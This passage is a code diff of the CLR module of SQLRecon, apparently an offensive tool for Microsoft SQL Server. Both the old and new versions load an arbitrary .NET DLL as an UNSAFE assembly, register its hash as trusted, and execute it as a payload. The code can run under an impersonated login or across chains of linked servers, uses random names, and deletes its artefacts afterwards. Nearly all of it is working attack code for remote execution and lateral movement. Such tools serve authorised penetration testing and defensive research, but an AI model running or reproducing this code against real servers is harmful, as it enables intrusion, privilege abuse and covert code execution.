@@ -1,485 +1,434 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Data.SqlClient;
 using System.IO;
 using System.Net;
 using System.Security.Cryptography;
+using SQLRecon.Commands;
 using SQLRecon.Utilities;
 
 namespace SQLRecon.Modules
 {
-    internal class CLR
+    internal abstract class Clr
     {
-        private static readonly Configure _config = new();
-        private static readonly PrintUtils _print = new();
-        private static readonly RandomString _rs = new();
-        private static readonly SqlQuery _sqlQuery = new();
-
         /// <summary>
-        /// The Standard method loads and executes a custom .NET assembly 
-        /// on a remote SQL server instance.
-        /// </summary>
-        /// <param name="con"></param>
-        /// <param name="dll"></param>
-        /// <param name="function"></param>
-        public void Standard(SqlConnection con, string dll, string function)
-        {
-
-            // First check to see if clr integration is enabled.
-            string sqlOutput = _config.ModuleStatus(con, "clr enabled");
-
-            if (!sqlOutput.Contains("1"))
-            {
-                _print.Error("You need to enable CLR (enableclr).", true);
-                // Go no futher.
-                return;
-            }
-
-            // Get the SHA-512 hash for the DLL and convert the DLL to bytes
-            string[] dllArr = _convertDLLToSQLBytes(dll);
-            string dllHash = dllArr[0];
-            string dllBytes = dllArr[1];
-
-            if (dllHash.Length != 128)
-            {
-                _print.Error("Unable to calculate hash for DLL.", true);
-                // Go no further.
-                return;
-            }
-
-            // Generate a new random string for the trusted hash path and the assembly name.
-            string dllPath = _rs.Generate(8);
-            string assem = _rs.Generate(8);
-
-            // Check to see if the hash already exists.
-            sqlOutput = _sqlQuery.ExecuteCustomQuery(con, "SELECT * FROM sys.trusted_assemblies where hash = 0x" + dllHash + ";");
-
-            if (sqlOutput.Contains("System.Byte[]"))
-            {
-                _print.Status("Hash already exists in sys.trusted_assemblies. Deleting it before moving forward.", true);
-                _sqlQuery.ExecuteQuery(con, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
-            }
-
-            // Add the DLL hash into the trusted_assemblies table on the SQL Server. Set a random name for the DLL hash.
-            _sqlQuery.ExecuteQuery(con, "EXEC sp_add_trusted_assembly 0x" + dllHash + ",N'" + dllPath +
-                    ", version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';");
-
-            // Verify that the SHA-512 hash has been added.
-            sqlOutput = _sqlQuery.ExecuteCustomQuery(con, "SELECT * FROM sys.trusted_assemblies;");
-
-            if (sqlOutput.Contains(dllPath))
-            {
-                _print.Success(string.Format("Added SHA-512 hash for '{0}' to sys.trusted_assemblies with a random name of '{1}'.", dll, dllPath), true);
-            }
-            else
-            {
-                _print.Error("Unable to add hash to sys.trusted_assemblies.", true);
-                // Go no further.
-                return;
-            }
-
-            // Drop the procedure name, which is the same as the function name if it exists already.
-            // Drop the assembly name if it exists already.
-            _sqlQuery.ExecuteQuery(con, "DROP PROCEDURE IF EXISTS " + function + ";");
-            _sqlQuery.ExecuteQuery(con, "DROP ASSEMBLY IF EXISTS " + assem + ";");
-
-            // Create a new custom assembly with the randomly generated name.
-            _print.Status(string.Format("Creating a new custom assembly with the name '{0}'.", assem), true);
-            _sqlQuery.ExecuteQuery(con, "CREATE ASSEMBLY " + assem + " FROM 0x" + dllBytes + " WITH PERMISSION_SET = UNSAFE;");
-
-            // Check to see if the custom assembly has been created
-            sqlOutput = _sqlQuery.ExecuteQuery(con, "SELECT * FROM sys.assemblies where name = '" + assem + "';");
-
-            if (sqlOutput.Contains(assem))
-            {
-                _print.Success(string.Format("Created a new custom assembly with the name '{0}' and loaded the DLL into it.", assem), true);
-            }
-            else
-            {
-                _print.Error(string.Format("Unable to create a new assembly. Cleaning up."), true);
-                _sqlQuery.ExecuteQuery(con, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
-                _sqlQuery.ExecuteQuery(con, "DROP ASSEMBLY IF EXISTS " + assem + ";");
-                // Go no further.
-                return;
-            }
-
-            /* Create a stored procedure based on the function name in the DLL.
-            * 
-            * Interestingly, this query needs to be executed with 'ExecuteNonQuery'
-            * as this will execute the query as a block. In MS SQL manager, this command
-            * will need to be executed with a GO before it, and a GO after it a
-            *'CREATE/ALTER PROCEDURE' must be the first statement in a query batch.
-            */
-            _print.Status(string.Format("Loading DLL into stored procedure '{0}'.", function), true);
-            try
-            {
-                SqlCommand query = new(
-                "CREATE PROCEDURE [dbo].[" + function + "]" +
-                "AS EXTERNAL NAME [" + assem + "].[StoredProcedures].[" + function + "]", con);
-
-                query.ExecuteNonQuery();
-            }
-            catch (Exception e)
-            {
-                _print.Error(string.Format("{0}", e), true);
-            }
-
-            sqlOutput = _sqlQuery.ExecuteCustomQuery(con, "SELECT SCHEMA_NAME(schema_id), name FROM sys.procedures WHERE type = 'PC';");
-
-            if (sqlOutput.Contains(function))
-            {
-                _print.Success(string.Format("Created '[{0}].[StoredProcedures].[{1}]'.", assem, function), true);
-            }
-            else
-            {
-                _print.Error("Unable to load DLL into custom stored procedure. Cleaning up.", true);
-                _sqlQuery.ExecuteQuery(con, "DROP PROCEDURE IF EXISTS " + function + ";");
-                _sqlQuery.ExecuteQuery(con, "DROP ASSEMBLY IF EXISTS " + assem + ";");
-                _sqlQuery.ExecuteQuery(con, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
-                // Go no futher.
-                return;
-            }
-
-            // Executing new custom assembly and stored procedure.
-            _print.Status("Executing payload ...", true);
-            _sqlQuery.ExecuteQuery(con, "EXEC " + function);
-
-            // Cleaning up.
-            _print.Status(string.Format("Cleaning up. Deleting assembly '{0}', stored procedure '{1}' and hash from sys.trusted_assembly.", assem, function), true);
-            _sqlQuery.ExecuteQuery(con, "DROP PROCEDURE IF EXISTS " + function + ";");
-            _sqlQuery.ExecuteQuery(con, "DROP ASSEMBLY IF EXISTS " + assem + ";");
-            _sqlQuery.ExecuteQuery(con, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
-        }
-
-        /// <summary>
-        /// The Impersonate method loads and executes a custom .NET assembly 
-        /// on a remote SQL server instance using impersonation.
+        /// The StandardOrImpersonation method loads and executes a custom .NET assembly 
+        /// on a remote SQL server instance. Impersonation is supported.
         /// </summary>
         /// <param name="con"></param>
         /// <param name="dll"></param>
         /// <param name="function"></param>
         /// <param name="impersonate"></param>
-        public void Impersonate(SqlConnection con, string dll, string function, string impersonate = "null")
+        internal static void StandardOrImpersonation(SqlConnection con, string dll, string function, string impersonate = null)
         {
-
-            // First check to see if clr integration is enabled.
-            string sqlOutput = _config.ModuleStatus(con, "clr enabled", impersonate);
-
-            if (!sqlOutput.Contains("1"))
-            {
-                _print.Error("You need to enable CLR (ienableclr).", true);
-                // Go no futher.
-                return;
-            }
-
-            // Get the SHA-512 hash for the DLL and convert the DLL to bytes.
+            // Get the SHA-512 hash for the DLL and convert the DLL to bytes
             string[] dllArr = _convertDLLToSQLBytes(dll);
             string dllHash = dllArr[0];
             string dllBytes = dllArr[1];
-
-            if (dllHash.Length != 128)
+            
+            // Generate a new random string for the trusted hash path and the assembly name.
+            string dllPath = RandomStr.Generate(8);
+            string assem = RandomStr.Generate(8);
+            
+            // The queries dictionary contains all queries used by this module
+            Dictionary<string, string> queries = new Dictionary<string, string>
             {
-                _print.Error("Unable to calculate hash for DLL.", true);
-                // Go no futher.
+                { "check_clr_hash", string.Format(Query.CheckClrHash, dllHash) },
+                { "drop_clr_hash",  string.Format(Query.DropClrHash, dllHash) },
+                { "add_clr_hash", string.Format(Query.AddClrHash, dllHash, dllPath) },
+                { "list_trusted_assemblies", Query.GetTrustedAssemblies },
+                { "drop_procedure",  string.Format(Query.DropProcedure, function) },
+                { "drop_assembly", string.Format(Query.DropClrAssembly, assem) },
+                { "create_assembly", string.Format(Query.CreateAssembly, assem, dllBytes) },
+                { "list_assembly", string.Format(Query.GetAssembly, assem) },
+                { "list_stored_procedures",  Query.GetStoredProcedures },
+                { "execute_clr_payload", string.Format(Query.ExecutePayload, function) }
+            };
+            
+            // If impersonation is set, then prepend all queries with the
+            // "EXECUTE AS LOGIN = '" + impersonate + "'; " statement.
+            if (!string.IsNullOrEmpty(impersonate))
+            {
+                queries = Format.ImpersonationDictionary(impersonate, queries);
+            }
+            
+            // These queries do not need to have the impersonation login prepended in front of them.
+            queries.Add("login", string.Format(Query.ImpersonationLogin, impersonate) );
+            queries.Add("load_dll_into_stored_procedure", string.Format(Query.LoadDllIntoStoredProcedure, function, assem) );
+
+            // If /debug is provided, only print the queries then gracefully exit the program.
+            if (Print.DebugQueries(queries))
+            {
+                // Go no further
+                return;
+            }  
+            
+            // First check to see if clr integration is enabled. 
+            // Impersonation is supported.
+            bool status = (string.IsNullOrEmpty(impersonate))
+                ? Config.ModuleStatus(con, "clr enabled")
+                : Config.ModuleStatus(con, "clr enabled", impersonate);
+            
+            if (status == false)
+            {
+                Print.Error("You need to enable CLR (enableclr).", true);
+                // Go no further.
                 return;
             }
-
-            // Generate a new random string for the trusted hash path and the assembly name.
-            string dllPath = _rs.Generate(8);
-            string assem = _rs.Generate(8);
-
+            
+            if (dllHash.Length != 128)
+            {
+                Print.Error("Unable to calculate hash for DLL.", true);
+                // Go no further.
+                return;
+            }
+            
             // Check to see if the hash already exists.
-            sqlOutput = _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "SELECT * FROM sys.trusted_assemblies where hash = 0x" + dllHash + "; ");
-
+            string sqlOutput = Sql.CustomQuery(con, queries["check_clr_hash"]);
+            
+            if (sqlOutput.ToLower().Contains("permission was denied"))
+            {
+                Print.Error($"You do not have the correct privileges to perform this action.", true);
+                // Go no further.
+                return;
+            }
+            
             if (sqlOutput.Contains("System.Byte[]"))
             {
-                _print.Status("Hash already exists in sys.trusted_assemblies. Deleting it before moving forward.", true);
-                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
+                Print.Status("Hash already exists in sys.trusted_assemblies. Deleting it before moving forward.", true);
+                sqlOutput = Sql.Query(con, queries["drop_clr_hash"]);
+            }
+            
+            if (sqlOutput.ToLower().Contains("permission was denied"))
+            {
+                Print.Error($"You do not have the correct privileges to perform this action.", true);
+                // Go no further.
+                return;
             }
 
             // Add the DLL hash into the trusted_assemblies table on the SQL Server. Set a random name for the DLL hash.
-            _sqlQuery.ExecuteImpersonationQuery(con, impersonate,
-                "EXEC sp_add_trusted_assembly 0x" + dllHash + ",N'" + dllPath +
-                 ", version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';");
-
+            Sql.Query(con, queries["add_clr_hash"]);
+           
             // Verify that the SHA-512 hash has been added.
-            sqlOutput = _sqlQuery.ExecuteImpersonationCustomQuery(con, impersonate,
-                "SELECT * FROM sys.trusted_assemblies;");
+            sqlOutput = Sql.CustomQuery(con, queries["list_trusted_assemblies"]);
 
             if (sqlOutput.Contains(dllPath))
             {
-                _print.Success(string.Format("Added SHA-512 hash for '{0}' to sys.trusted_assemblies with a random name of '{1}'.", dll, dllPath), true);
+                Print.Success($"Added SHA-512 hash for '{dll}' to sys.trusted_assemblies with a random name of '{dllPath}'.", true);
             }
             else
             {
-                _print.Error("Unable to add hash to sys.trusted_assemblies.", true);
+                Print.Error("Unable to add hash to sys.trusted_assemblies.", true);
                 // Go no further.
                 return;
             }
-
 
             // Drop the procedure name, which is the same as the function name if it exists already.
             // Drop the assembly name if it exists already.
-            _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "DROP PROCEDURE IF EXISTS " + function + ";");
-            _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "DROP ASSEMBLY IF EXISTS " + assem + ";");
+            Sql.Query(con, queries["drop_procedure"]);
+            Sql.Query(con, queries["drop_assembly"]);
 
             // Create a new custom assembly with the randomly generated name.
-            _print.Status(string.Format("Creating a new custom assembly with the name '{0}'.", assem), true);
-            _sqlQuery.ExecuteImpersonationQuery(con, impersonate,
-                "CREATE ASSEMBLY " + assem + " FROM 0x" + dllBytes + " WITH PERMISSION_SET = UNSAFE;");
-
+            Print.Status($"Creating a new custom assembly with the name '{assem}'.", true);
+            Sql.Query(con, queries["create_assembly"]);
 
             // Check to see if the custom assembly has been created
-            sqlOutput = _sqlQuery.ExecuteImpersonationQuery(con, impersonate,
-                "SELECT * FROM sys.assemblies where name = '" + assem + "';");
+            sqlOutput = Sql.Query(con, queries["list_assembly"]);
 
             if (sqlOutput.Contains(assem))
             {
-                _print.Success(string.Format("Created a new custom assembly with the name '{0}' and loaded the DLL into it.", assem), true);
+                Print.Success($"Created a new custom assembly with the name '{assem}' and loaded the DLL into it.", true);
             }
             else
             {
-                _print.Error(string.Format("Unable to create a new assembly. Cleaning up."), true);
-                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
-                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "DROP ASSEMBLY IF EXISTS " + assem + ";");
+                Print.Error("Unable to create a new assembly. Cleaning up.", true);
+                Sql.Query(con, queries["drop_clr_hash"]);
+                Sql.Query(con, queries["drop_assembly"]);
                 // Go no further.
                 return;
             }
-
-
-            /* Create a stored procedure based on the function name in the DLL.
-            * 
-            * Interestingly, this query needs to be executed with 'ExecuteNonQuery'
-            * as this will execute the query as a block. In MS SQL manager, this command
-            * will need to be executed with a GO before it, and a GO after it a
-            *'CREATE/ALTER PROCEDURE' must be the first statement in a query batch.
-            */
-            _print.Error(string.Format("Unable to create a new assembly. Cleaning up."), true);
-            try
+            
+            Print.Status($"Loading DLL into stored procedure '{function}'.", true);
+            
+            /*
+             * Create a stored procedure based on the function name in the DLL.
+             * Interestingly, this query needs to be executed with 'ExecuteNonQuery'
+             * as this will execute the query as a block. In MS SQL manager, this command
+             * will need to be executed with a GO before it, and a GO after it a
+             * 'CREATE/ALTER PROCEDURE' must be the first statement in a query batch.
+             */
+            if (string.IsNullOrEmpty(impersonate))
             {
-                SqlCommand query = new(
-                "EXECUTE AS LOGIN = '" + impersonate + "';", con);
+                try
+                {
+                    SqlCommand query = new(queries["load_dll_into_stored_procedure"], con);
 
-                query.ExecuteNonQuery();
-
-                query = new(
-                    "CREATE PROCEDURE [dbo].[" + function + "]" +
-                    "AS EXTERNAL NAME [" + assem + "].[StoredProcedures].[" + function + "]", con);
-                
-                query.ExecuteNonQuery();
-            }
-            catch (Exception e)
-            {
-                _print.Error(string.Format("{0}", e), true);
-            }
-
-            sqlOutput = _sqlQuery.ExecuteImpersonationCustomQuery(con, impersonate,
-                "SELECT SCHEMA_NAME(schema_id), name FROM sys.procedures WHERE type = 'PC';");
-
-            if (sqlOutput.Contains(function))
-            {
-                _print.Success(string.Format("Created '[{0}].[StoredProcedures].[{1}]'.", assem, function), true);
+                    query.ExecuteNonQuery();
+                }
+                catch (Exception e)
+                {
+                    Print.Error($"{e}", true);
+                }
             }
             else
             {
-                _print.Error("Unable to load DLL into custom stored procedure. Cleaning up.", true);
-                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "DROP PROCEDURE IF EXISTS " + function + ";");
-                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "DROP ASSEMBLY IF EXISTS " + assem + ";");
-                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
-                // Go no futher.
+                try
+                {
+                    SqlCommand query = new(queries["login"], con);
+
+                    query.ExecuteNonQuery();
+
+                    query = new(queries["load_dll_into_stored_procedure"], con);
+                
+                    query.ExecuteNonQuery();
+                }
+                catch (Exception e)
+                {
+                    Print.Error($"{e}", true);
+                }
+            }
+            
+            sqlOutput = Sql.CustomQuery(con, queries["list_stored_procedures"]);
+
+            if (sqlOutput.Contains(function))
+            {
+                Print.Success($"Created '[{assem}].[StoredProcedures].[{function}]'.", true);
+            }
+            else
+            {
+                Print.Error("Unable to load DLL into custom stored procedure. Cleaning up.", true);
+                Sql.Query(con, queries["drop_procedure"]);
+                Sql.Query(con, queries["drop_assembly"]);
+                Sql.Query(con, queries["drop_clr_hash"]);
+                // Go no further.
                 return;
             }
 
             // Executing new custom assembly and stored procedure.
-            _print.Status("Executing payload ...", true);
-            _sqlQuery.ExecuteImpersonationCustomQuery(con, impersonate, "EXEC " + function);
+            Print.Status("Executing payload ...", true);
+            Sql.Query(con, queries["execute_clr_payload"]);
 
-            // Cleaning up
-            _print.Status(string.Format("Cleaning up. Deleting assembly '{0}', stored procedure '{1}' and hash from sys.trusted_assembly.", assem, function), true); 
-            _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "DROP PROCEDURE IF EXISTS " + function + ";");
-            _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "DROP ASSEMBLY IF EXISTS " + assem + ";");
-            _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
+            // Cleaning up.
+            Print.Status($"Cleaning up. Deleting assembly '{assem}', stored procedure '{function}' and hash from sys.trusted_assembly.", true);
+            Sql.Query(con, queries["drop_procedure"]);
+            Sql.Query(con, queries["drop_assembly"]);
+            Sql.Query(con, queries["drop_clr_hash"]);
         }
-
+        
         /// <summary>
-        /// The Linked method loads and executes a custom .NET assembly 
-        /// on a remote linked SQL server instance
+        /// The LinkedOrChain method loads and executes a custom .NET assembly on a remote linked SQL server instance.
+        /// Execution against the last SQL server specified in a chain of linked SQL servers is supported.
         /// </summary>
         /// <param name="con"></param>
         /// <param name="dll"></param>
         /// <param name="function"></param>
         /// <param name="linkedSqlServer"></param>
         /// <param name="sqlServer"></param>
-        public void Linked(SqlConnection con, string dll, string function, string linkedSqlServer, string sqlServer)
+        /// <param name="linkedSqlServerChain"></param>
+        internal static void LinkedOrChain(SqlConnection con, string dll, string function, string linkedSqlServer, string sqlServer, string[] linkedSqlServerChain = null)
         {
-            // First check to see if rpc is enabled.
-            string sqlOutput = _config.ModuleStatus(con, "rpc", "null", linkedSqlServer);
-            if (!sqlOutput.Contains("1"))
+            // Get the SHA-512 hash for the DLL and convert the DLL to bytes
+            string[] dllArr = _convertDLLToSQLBytes(dll);
+            string dllHash = dllArr[0];
+            string dllBytes = dllArr[1];
+            
+            // Generate a new random string for the trusted hash path and the assembly name.
+            string dllPath = RandomStr.Generate(8);
+            string assem = RandomStr.Generate(8);
+            
+            // The queries dictionary contains all queries used by this module
+            Dictionary<string, string> queries = new Dictionary<string, string>
+            
             {
-                _print.Error(string.Format("You need to enable RPC for {1} on {0} (enablerpc -o {1}).",
-                    sqlServer, linkedSqlServer), true);
-                // Go no futher.
+                { "check_clr_hash", string.Format(Query.CheckClrHash, dllHash) },
+                { "rpc_drop_clr_hash",  string.Format(Query.DropClrHash, dllHash) },
+                { "rpc_add_clr_hash", string.Format(Query.AddClrHash, dllHash, dllPath) },
+                { "list_trusted_assemblies", Query.GetTrustedAssemblies },
+                { "rpc_drop_procedure",  string.Format(Query.DropProcedure, function) },
+                { "rpc_drop_assembly", string.Format(Query.DropClrAssembly, assem) },  
+                { "rpc_load_dll_into_stored_procedure", string.Format(Query.LoadDllIntoStoredProcedure, function, assem) },
+                { "rpc_create_assembly", string.Format(Query.CreateAssembly, assem, dllBytes) },
+                { "list_assembly", string.Format(Query.GetAssembly, assem) },
+                { "list_stored_procedures",  Query.GetStoredProcedures },
+                { "rpc_execute_clr_payload",  string.Format(Query.ExecutePayload, function) }
+            };
+            
+            queries = (linkedSqlServerChain == null) 
+                // Format all queries so that they are compatible for execution on a linked SQL server.
+                ? Format.LinkedDictionary(linkedSqlServer, queries)
+                // Format all queries so that they are compatible for execution on the last SQL server specified in a linked chain.
+                : Format.LinkedChainDictionary(linkedSqlServerChain, queries);
+            
+            // If /debug is provided, only print the queries then gracefully exit the program.
+            if (Print.DebugQueries(queries))
+            {
+                // Go no further
+                return;
+            } 
+            
+            // First check to see if rpc is enabled.
+            if (Config.ModuleStatus(con, "rpc", null, linkedSqlServer) == false)
+            {
+                Print.Error(
+                    $"You need to enable RPC for {linkedSqlServer} on {sqlServer} (enablerpc /rhost:{linkedSqlServer}).", true);
+                // Go no further.
                 return;
             }
 
             // Then check to see if clr integration is enabled.
-            sqlOutput = _config.LinkedModuleStatus(con, "clr enabled", linkedSqlServer);
-            if (!sqlOutput.Contains("1"))
+            if (Config.LinkedModuleStatus(con, "clr enabled", linkedSqlServer, linkedSqlServerChain) == false)
             {
-                _print.Error("You need to enable CLR (lenableclr).", true);
-                // Go no futher.
+                Print.Error("You need to enable CLR (enableclr).", true);
+                // Go no further.
                 return;
             }
-
-            // Get the SHA-512 hash for the DLL and convert the DLL to bytes.
-            string[] dllArr = _convertDLLToSQLBytes(dll);
-            string dllHash = dllArr[0];
-            string dllBytes = dllArr[1];
-
+           
             if (dllHash.Length != 128)
             {
-                _print.Error("Unable to calculate hash for DLL.", true);
-                // Go no futher.
+                Print.Error("Unable to calculate hash for DLL.", true);
+                // Go no further.
                 return;
             }
-
-            // Generate a new random string for the trusted hash path and the assembly name.
-            string dllPath = _rs.Generate(8);
-            string assem = _rs.Generate(8);
-
+            
             // Check to see if the hash already exists.
-            sqlOutput = _sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer,
-                "SELECT * FROM sys.trusted_assemblies where hash = 0x" + dllHash + ";");
+            string sqlOutput = Sql.CustomQuery(con, queries["check_clr_hash"]);
 
+            if (sqlOutput.ToLower().Contains("permission was denied"))
+            {
+                Print.Error($"You do not have the correct privileges to perform this action.", true);
+                // Go no further.
+                return;
+            }
+            
             if (sqlOutput.Contains("System.Byte[]"))
             {
-                _print.Status("Hash already exists in sys.trusted_assemblies. Deleting it before moving forward.", true);
-                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, 
-                    "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
+                Print.Status("Hash already exists in sys.trusted_assemblies. Deleting it before moving forward.", true);
+                sqlOutput = Sql.CustomQuery(con, queries["rpc_drop_clr_hash"]);
+            }
+            
+            if (sqlOutput.ToLower().Contains("permission was denied"))
+            {
+                Print.Error($"You do not have the correct privileges to perform this action.", true);
+                // Go no further.
+                return;
             }
 
             // Add the DLL hash into the trusted_assemblies table on the SQL Server. Set a random name for the DLL hash.
-            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, 
-                "EXEC sp_add_trusted_assembly 0x" + dllHash + ",N''" + dllPath +
-                    ", version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil'';");
-
+            Sql.CustomQuery(con, queries["rpc_add_clr_hash"]);
+            
             // Verify that the SHA-512 hash has been added.
-            sqlOutput = _sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer,
-                "SELECT * FROM sys.trusted_assemblies;");
-
+            sqlOutput = Sql.CustomQuery(con, queries["list_trusted_assemblies"]);
+            
             if (sqlOutput.Contains(dllPath))
             {
-                _print.Success(string.Format("Added SHA-512 hash for '{0}' to sys.trusted_assemblies with a random name of '{1}'.", dll, dllPath), true);
+                Print.Success(
+                    $"Added SHA-512 hash for '{dll}' to sys.trusted_assemblies with a random name of '{dllPath}'.", true);
             }
             else
             {
-                _print.Error("Unable to add hash to sys.trusted_assemblies.", true);
+                Print.Error("Unable to add hash to sys.trusted_assemblies.", true);
                 // Go no further.
                 return;
             }
 
             // Drop the procedure name, which is the same as the function name if it exists already.
             // Drop the assembly name if it exists already.
-            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "DROP PROCEDURE IF EXISTS " + function + ";");
-            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "DROP ASSEMBLY IF EXISTS " + assem + ";");
+            Sql.CustomQuery(con, queries["rpc_drop_procedure"]);
+            Sql.CustomQuery(con, queries["rpc_drop_assembly"]);
 
             // Create a new custom assembly with the randomly generated name.
-            _print.Status(string.Format("Creating a new custom assembly with the name '{0}'.", assem), true);
-            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, 
-                "CREATE ASSEMBLY " + assem + " FROM 0x" + dllBytes + " WITH PERMISSION_SET = UNSAFE;");
-
+            Print.Status($"Creating a new custom assembly with the name '{assem}'.", true);
+            
+            Sql.CustomQuery(con, queries["rpc_create_assembly"]);
+            
             // Check to see if the custom assembly has been created
-            sqlOutput = _sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer,
-                "SELECT * FROM sys.assemblies where name = ''" + assem + "'';");
-
+            sqlOutput = Sql.CustomQuery(con, queries["list_assembly"]);
+            
             if (sqlOutput.Contains(assem))
             {
-                _print.Success(string.Format("Created a new custom assembly with the name '{0}' and loaded the DLL into it.", assem), true);
+                Print.Success($"Created a new custom assembly with the name '{assem}' and loaded the DLL into it.", true);
             }
             else
             {
-                _print.Error(string.Format("Unable to create a new assembly. Cleaning up."), true);
-                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
-                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "DROP ASSEMBLY IF EXISTS " + assem + ";");
+                Print.Error("Unable to create a new assembly. Cleaning up.", true);
+                Sql.CustomQuery(con, queries["rpc_drop_clr_hash"]);
+                Sql.CustomQuery(con, queries["rpc_drop_assembly"]);
                 // Go no further.
                 return;
             }
 
-            /* Create a stored procedure based on the function name in the DLL.
-             * 
+            /*
+             * Create a stored procedure based on the function name in the DLL.
              * Interestingly, this query needs to be executed with 'ExecuteNonQuery'
              * as this will execute the query as a block. In MS SQL manager, this command
              * will need to be executed with a GO before it, and a GO after it a
-             *'CREATE/ALTER PROCEDURE' must be the first statement in a query batch.
+             * 'CREATE/ALTER PROCEDURE' must be the first statement in a query batch.
              */
 
-            _print.Status(string.Format("Loading DLL into stored procedure '{0}'.", function), true);
+            Print.Status($"Loading DLL into stored procedure '{function}'.", true);
             try
             {
-                SqlCommand query = new("EXECUTE ('" +
-                    "CREATE PROCEDURE [dbo].[" + function + "]" +
-                    "AS EXTERNAL NAME [" + assem + "].[StoredProcedures].[" + function + "]" +
-                    "') AT " + linkedSqlServer + ";", con);
+                SqlCommand query = new(queries["rpc_load_dll_into_stored_procedure"], con);
                 
                 query.ExecuteNonQuery();
             }
             catch (Exception e)
             {
-                _print.Error(string.Format("{0}", e), true);
+                Print.Error($"{e}", true);
             }
 
-            sqlOutput = _sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer,
-                "SELECT SCHEMA_NAME(schema_id), name FROM sys.procedures WHERE type = ''PC'';");
-
+            sqlOutput = Sql.CustomQuery(con, queries["list_stored_procedures"]);
+            
             if (sqlOutput.Contains(function))
             {
-                _print.Success(string.Format("Created '[{0}].[StoredProcedures].[{1}]'.", assem, function), true);
+                Print.Success($"Created '[{assem}].[StoredProcedures].[{function}]'.", true);
             }
             else
             {
-                _print.Error("Unable to load DLL into custom stored procedure. Cleaning up.", true);
-                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "DROP PROCEDURE IF EXISTS " + function + ";");
-                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "DROP ASSEMBLY IF EXISTS " + assem + ";");
-                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
-                // Go no futher.
+                Print.Error("Unable to load DLL into custom stored procedure. Cleaning up.", true);
+                Sql.CustomQuery(con, queries["rpc_drop_procedure"]);
+                Sql.CustomQuery(con, queries["rpc_drop_assembly"]);
+                Sql.CustomQuery(con, queries["rpc_drop_clr_hash"]);
+                
+                // Go no further.
                 return;
-
             }
 
-            // Cxecuting new custom assembly and stored procedure.
-            _print.Status("Executing payload ...", true);
-            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "EXEC " + function);
+            // Executing new custom assembly and stored procedure.
+            Print.Status("Executing payload ...", true);
+            Sql.CustomQuery(con, queries["rpc_execute_clr_payload"]);
 
             // Cleaning up.
-            _print.Status(string.Format("Cleaning up. Deleting assembly '{0}', stored procedure '{1}' and hash from sys.trusted_assembly.", assem, function), true);
-            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "DROP PROCEDURE IF EXISTS " + function + ";");
-            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "DROP ASSEMBLY IF EXISTS " + assem + ";");
-            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
+            Print.Status($"Cleaning up. Deleting assembly '{assem}', stored procedure '{function}' and hash from sys.trusted_assembly.", true);
+            Sql.CustomQuery(con, queries["rpc_drop_procedure"]);
+            Sql.CustomQuery(con, queries["rpc_drop_assembly"]);
+            Sql.CustomQuery(con, queries["rpc_drop_clr_hash"]);
         }
-
+        
         /// <summary>
         /// The _convertDLLToSQLBytesFile method will take a .NET assembly on disk and covert it
         /// to SQL compatible byte format for storage in a stored procedure.
         /// </summary>
         /// <param name="dll"></param>
         /// <returns></returns>
-        private string[] _convertDLLToSQLBytesFile(string dll)
+        private static string[] _convertDLLToSQLBytesFile(string dll)
         {
             string[] dllArr = new string[2];
             string dllHash = "";
             string dllBytes = "";
 
-            // Read the DLL, create a SHA-512 hash for it and convert the DLL to SQL compatible bytes.
+            // Read the DLL, create an SHA-512 hash for it and convert the DLL to SQL compatible bytes.
             try
             {
                 FileInfo fileInfo = new FileInfo(dll);
-                _print.Status(string.Format("{0} is {1} bytes, this will take a minute ...", dll, fileInfo.Length), true);
+                Print.Status($"{dll} is {fileInfo.Length} bytes.", true);
 
-                // Get the SHA-512 hash of the DLL so we can use sp_add_trusted_assembly to add it as a trusted DLL on the SQL server.
-                using (SHA512 SHA512 = SHA512Managed.Create())
